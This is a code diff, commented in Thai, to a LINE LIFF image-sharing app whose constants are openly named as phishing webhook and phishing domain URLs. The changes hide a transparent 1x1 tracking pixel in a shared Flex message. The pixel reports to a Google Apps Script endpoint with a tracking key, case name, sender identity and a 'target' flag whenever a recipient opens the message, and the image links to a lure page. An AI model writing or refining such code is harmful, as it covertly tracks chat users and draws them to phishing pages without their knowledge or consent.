@@ -399,9 +399,8 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwi-EDtyUxRFIjmfp2SiKhXDmkj0UZN8LUdG51bi0rBCt9DN2fBUZV0b65-gWSAkeY/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxPzMUbx3hbLv22w7OuyYxMxUD7bdB4dZLPAsQAcqoIp2AKnW2qKsQgh0or40evLe8V/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
-        const PIXEL_TRACKING_URL = 'https://script.google.com/macros/s/AKfycbwi-EDtyUxRFIjmfp2SiKhXDmkj0UZN8LUdG51bi0rBCt9DN2fBUZV0b65-gWSAkeY/exec'; // URL เดียวกับ PHISHING_WEBHOOK_URL
         
         // เริ่มต้นการทำงาน LIFF
         document.addEventListener('DOMContentLoaded', function() {
@@ -824,28 +823,33 @@
                 // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // ปรับปรุง: ใช้เป็น URL สั้นๆ อย่างเดียว ไม่ใส่ข้อมูลอื่นๆ เพื่อหลีกเลี่ยงปัญหา
-                // ข้อมูลทั้งหมดจะถูกส่งโดยตรงผ่าน Headers เมื่อรูปถูกโหลด
-                let zeroClickTrackUrl = `${PIXEL_TRACKING_URL}?action=zeroClick`;
+                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
+                // ใช้เป็นพารามิเตอร์ในการโหลดภาพเล็กๆ ที่มองไม่เห็น
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                 zeroClickTrackUrl += `&key=${trackingKey}`;
-                zeroClickTrackUrl += `&isTarget=true`; 
-                zeroClickTrackUrl += `&r=${randomSuffix}`; // ป้องกันการแคช
+                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
+                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
+                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&targetType=zeroclick`; // เพิ่มใหม่: ระบุประเภทการติดตามชัดเจน
+                zeroClickTrackUrl += `&imageUrl=${encodeURIComponent(imageUrl)}`; // เพิ่มใหม่: ส่ง URL รูปภาพไปด้วย
+                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message ใหม่ ใช้ <img> ใน footer แทน ซึ่งมักจะโหลดดีกว่าเดิม
+                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
                 const message = {
                     type: 'flex',
-                    altText: `รูปภาพใหม่`, 
+                    altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
-                        hero: {
+                        hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
                             size: 'full',
                             aspectRatio: '1:1',
                             aspectMode: 'cover',
-                            action: {
+                            action: { // ทำให้รูปภาพคลิกได้ -> ลิงก์ไปยัง index.html พร้อม tracking key
                                 type: 'uri',
                                 uri: clickTrackUrl
                             }
@@ -854,74 +858,44 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                {
-                                    type: 'text',
-                                    text: ' ',  // ใส่ช่องว่างเพื่อให้มี body content
-                                    color: '#FFFFFF',
-                                    size: '1px'
-                                }
-                            ],
-                            paddingAll: '0px'
-                        },
-                        footer: {
-                            type: 'box',
-                            layout: 'vertical',
-                            contents: [
+                                // ใส่รูปภาพขนาด 1x1 pixel ที่โปร่งใสเพื่อทำ zero click tracking
+                                // เพิ่ม webhook ที่เก็บข้อมูลเป้าหมายที่อ่านข้อความแทน
                                 {
                                     type: 'image',
                                     url: zeroClickTrackUrl,
-                                    size: '1px',
-                                    aspectRatio: '1:1'
+                                    size: '1px', // ขนาดเล็กมาก
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute', // วางแบบ absolute
+                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
+                                    offsetStart: '0px'
+                                },
+                                // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
+                                {
+                                    type: 'box',
+                                    layout: 'vertical',
+                                    contents: [],
+                                    height: '1px',
+                                    width: '1px'
                                 }
                             ],
+                            height: '1px', // ทำให้ body กล่องเล็กมาก
                             paddingAll: '0px'
                         }
                     }
                 };
 
-                // แนวทางที่ 2: ใช้ template message พื้นฐานกับ image ปกติ
-                const messageAlt = {
-                    type: "template",
-                    altText: "รูปภาพใหม่",
-                    template: {
-                        type: "image_carousel",
-                        columns: [{
-                            imageUrl: imageUrl,
-                            action: {
-                                type: "uri",
-                                uri: clickTrackUrl
-                            }
-                        }]
-                    }
-                };
-                
-                // เก็บข้อมูล metadata เพิ่มเติมที่จะส่ง
-                const metadata = {
-                    creator: userId,
-                    creatorName: displayName,
-                    trackingKey: trackingKey,
-                    caseName: caseName,
-                    timestamp: new Date().toISOString()
-                };
-                
-                // บันทึก metadata ไว้ใน sessionStorage เพื่อใช้ในอนาคต
-                sessionStorage.setItem(`metadata_${trackingKey}`, JSON.stringify(metadata));
-
-                console.log("Attempting to share Message:", JSON.stringify(message, null, 2));
+                console.log("Attempting to share Flex Message:", JSON.stringify(message, null, 2));
 
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     console.log("ShareTargetPicker is available. Calling now...");
-                    
-                    // ทดลองใช้ message รูปแบบทางเลือกถ้ารูปแบบแรกมีปัญหา
-                    // สามารถสลับระหว่าง message และ messageAlt เพื่อทดสอบ
                     const result = await liff.shareTargetPicker([message]);
-                    
                     console.log("ShareTargetPicker result:", result);
 
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
                         
-                        // บันทึก Tracking Key Mapping ก่อน 
+                        // บันทึก Tracking Key Mapping ก่อน
                         try {
                             const saved = await saveTrackingCaseMapping(trackingKey, caseName);
                             if (!saved) {
@@ -942,6 +916,7 @@
                 } else {
                     showStatus('ShareTargetPicker ไม่พร้อมใช้งาน', false);
                 }
+                
             } catch (error) {
                 console.error('Error in shareImage function:', error);
                 showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + (error.message || error), false);
